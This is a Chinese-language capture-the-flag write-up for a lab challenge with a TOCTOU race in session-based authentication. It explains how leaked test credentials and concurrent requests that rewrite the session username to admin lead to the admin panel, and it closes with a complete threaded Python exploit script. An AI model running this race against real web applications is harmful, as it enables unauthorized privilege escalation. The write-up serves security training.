# X-088-24
## 题目描述

> Sometimes the AuthN/AuthZ checks are vulnerable to TOCTOU issues if they are not implemented properly

## 知识点

条件竞争

## 解题思路

- 页面源码中（Login 页）可以看到注释提示存在测试账号，尝试 `test:test` 成功登录普通用户。
- 观察到服务端对同一 `session` Cookie 维持不变（server-side session），推测存在“登录校验使用一次、实际取用再读一次会话”的逻辑。
- 关键路径：
  - 发起 `GET /admin_panel` 触发“先校验会话（普通用户 test 通过）”。
  - 在校验通过与页面最终渲染之间的时间窗口，用同一个 `session` Cookie 并发 `POST /login`，将会话中的 `username` 切到 `admin`（密码随便填，目的只是改会话字段）。
  - 若服务端在渲染 Admin Panel 时再次从 server-side session 读取 `username` 并据此判断 `is_admin`，就会被成功“顶成 admin”，从而回显 flag。

## 解题步骤

1. 访问登录页 `http://ip32849/login`，查看页面源代码可见注释“Delete the testing account (test:test)”，用 `test:test` 登录成功。
![image.png](https://x/x12152551102.png)

2. 直接访问 `Admin Panel` 会提示无权限，确认需要管理员身份。
![image.png](https://x/x12152615065.png)

3. 编写并发脚本：
   - 保持最初 `test:test` 登录获取的 `session` Cookie 不变；
   - 每次竞争中，先 `GET /admin_panel`，稍作极短延迟，再 `POST /login`（`username=admin&password=x`）去修改同一个 server-side session 的 `username` 字段；
   - 重复若干次或分批并发冲击，一旦命中竞争窗口，即可在 `/admin_panel` 响应中看到 flag。
4. 运行脚本，拿到 `FLAG`。

## EXP
```python
import requests, threading, time, re, random

BASE = "http://ip32849"

bootstrap = requests.Session()
bootstrap.get(BASE + "/login", timeout=3)
bootstrap.post(BASE + "/login", data={"username":"test","password":"test"}, timeout=3)
COOKIE = bootstrap.cookies.get("session")

sess = requests.Session()
sess.cookies.set("session", COOKIE)
headers = {"Connection": "keep-alive"}

flag_re = re.compile(r"flag\{[^}]+\}", re.I)
flag = None
lock = threading.Lock()

def race_once(order=0):
    global flag
    if flag:
        return
    admin_text = None

    def get_admin():
        nonlocal admin_text
        try:
            r = sess.get(BASE + "/admin_panel", headers=headers, timeout=2)
            admin_text = r.text
        except:
            pass

    def flip_admin():
        try:
            sess.post(BASE + "/login", headers=headers,
                      data={"username":"admin","password":"x"}, timeout=2)
        except:
            pass

    if order == 0:
        t1 = threading.Thread(target=get_admin)
        t2 = threading.Thread(target=flip_admin)
        t1.start(); time.sleep(0.0005 + random.random()*0.0015); t2.start()
    else:
        t1 = threading.Thread(target=flip_admin)
        t2 = threading.Thread(target=get_admin)
        t1.start(); time.sleep(0.0002 + random.random()*0.0012); t2.start()
    t1.join(); t2.join()

    if admin_text:
        m = flag_re.search(admin_text)
        if m:
            with lock:
                if not flag:
                    flag = m.group(0)

for wave in range(20):
    threads = []
    for i in range(20):
        t = threading.Thread(target=race_once, args=(i % 2,))
        t.start(); threads.append(t)
    for t in threads: t.join()
    if flag:
        break

print(flag)
```